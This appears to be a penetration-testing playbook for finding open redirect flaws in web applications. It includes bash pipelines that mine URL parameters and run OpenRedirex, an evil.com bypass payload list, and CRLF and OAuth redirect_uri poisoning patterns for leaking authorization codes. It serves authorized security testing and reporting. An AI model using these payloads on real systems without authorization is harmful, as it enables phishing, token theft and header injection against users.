---
name: web-open-redirect-audit
description: Comprehensive open redirect identification, URL parameter mining, and filter bypass testing.
playbook: web-security
pivots_to:
  - identity-oauth-oidc-abuse
  - web-ssrf-cloud-pivot
  - identity-jwt-manipulation
---

# Web Open Redirect Audit

## Attack Vector Summary
Open redirect vulnerabilities occur when an application accepts untrusted input in URL redirection parameters (`redirect_url`, `next`, `return_to`, `url`, `target`, `dest`, `out`) and includes it in `Location` headers or client-side navigation (`window.location`) without proper validation.

## Tactical Heuristics & Step-by-Step Flow

### 1. Extract Redirect-Prone URLs from Archive Data (R10 Step 1)
Harvest historical URLs with redirection indicators:

```bash
# URLs with =http://, =https://, =//, or =/path/ patterns
grep -oP 'https?://[^"\s]*(redirect|return|next|url|link|href|target|goto|out|view|dest|destination|continue|window|to|path|uri|file|load)[^"\s]*' \
  Recon/target_gau.txt Recon/target_wayback.txt 2>/dev/null | \
  grep -oP '[^?]+\?[^"\s]*=[^&\s]*(http[s]?:|//|/)[^"\s]*' | \
  sort -u > Recon/GW_open_redirect.txt
```

### 2. Extract Redirect Parameters from Arjun Fuzzing (R10 Step 2)
```bash
grep -oP '[^?]+\?(redirect|return|next|url|link|href|target|goto|out|view|dest|destination|continue|window|to|path|uri|file|load)=[^&\s]+' \
  Recon/target_params.txt 2>/dev/null | sort -u > Recon/AQ_redirect.txt
```

### 3. Merge & Deduplicate (R10 Step 3)
```bash
cat Recon/GW_open_redirect.txt Recon/AQ_redirect.txt 2>/dev/null | sort -u > Recon/P_O_Redirect.txt
```

### 4. Automated Testing with OpenRedirex (R10 Step 4)
```bash
# Run OpenRedirex with multi-variant bypass payload list
cat Recon/P_O_Redirect.txt | \
  openredirex -p /tmp/open_redirect_payloads.txt -k "FUZZ" -c 50 2>/dev/null | \
  tee Recon/P_O_Redirect_results.txt

# Extract confirmed findings
grep -i "SUCCESS\|200\|redirect" Recon/P_O_Redirect_results.txt 2>/dev/null | \
  tee Recon/P_O_Redirect_findings.txt
```

#### Open Redirect Bypass Payload Suite:
```text
# 1. Standard & Scheme-Relative Bypasses
https://evil.com
//evil.com
///evil.com
https:evil.com
\/\/evil.com/
/\/evil.com/
evil.com
@evil.com
https://evil.com%23

# 2. Subdomain & Hostname Confusion (Regex Starts-With / Contains)
https://target.com.evil.com
https://evil.target.com
https://evil.com/target.com
https://target.com%40evil.com
https://target.com@evil.com
https://target.com%2f@evil.com
https://target.com%5c@evil.com
https://target.com\@evil.com

# 3. Path & Fragment Confusion
https://evil.com#target.com
https://evil.com/target.com
https://evil.com?redirect=target.com
//target.com@evil.com

# 4. Encoding & Protocol Manipulation
https://target.com%2eevil.com
https://target.com%2fevil.com
https://target.com%00@evil.com
https://target.com%0d%0aevil.com
/%09target.com
/%0dtarget.com
/%0atarget.com
/%09/target.com
..%2f..%2f..%2f..%2ftarget.com
/%5c%5c%5c%5ctarget.com
https://target.com:evil.com
https://evil.com:443@target.com
```

## Empirical Disclosed Report Patterns & High-Risk Matrices
| Vector / Pattern | Mechanism | Empirical Pattern | Expected Evidence Marker |
|---|---|---|---|
| Slash & Backslash Confusion | Parser treats `/\` or `//` as external domain | `/\evil.com` or `\/\/evil.com` | `Location: //evil.com` or browser navigation to `evil.com` |
| `@` Authority Hijack | URL parser interprets target.com as username | `https://target.com@attacker.com` | `302 Found` with `Location: https://target.com@attacker.com` |
| CRLF Header Injection | Injecting `\r\nLocation: https://evil.com` | `?redirect=%0d%0aLocation:%20https://evil.com` | Header injected into raw HTTP response stream |
| OAuth Callback Poisoning | Manipulating `redirect_uri` to attacker host | `/oauth/authorize?redirect_uri=https://target.com.evil.com` | Authorization code leaked in referer or query string |

## Evidence Collection & Validation Gate
- Must capture raw request and `302`/`301`/`307` response headers showing untrusted destination in `Location:`.
- If client-side (DOM-based `window.location = params.get('url')`), capture DOM source line and console execution trace.
- Evaluate against `/validate` 7-Question Validation Gate before reporting.
